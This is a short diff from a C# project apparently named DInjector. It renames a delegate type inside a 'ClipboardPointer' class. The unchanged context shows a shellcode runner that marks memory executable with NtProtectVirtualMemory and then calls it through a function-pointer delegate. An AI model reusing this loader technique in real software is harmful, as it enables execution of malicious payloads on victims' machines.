@@ -9,7 +9,7 @@ namespace DInjector
     class ClipboardPointer
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate void pFunction();
+        delegate void FunctionPtr();
 
         public static void Execute(byte[] shellcode, bool debug = false)
         {
@@ -44,7 +44,7 @@ namespace DInjector
             else
                 throw new Exception($"(ClipboardPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
 
-            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
+            FunctionPtr f = (FunctionPtr)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(FunctionPtr));
             f();
 
             #endregion
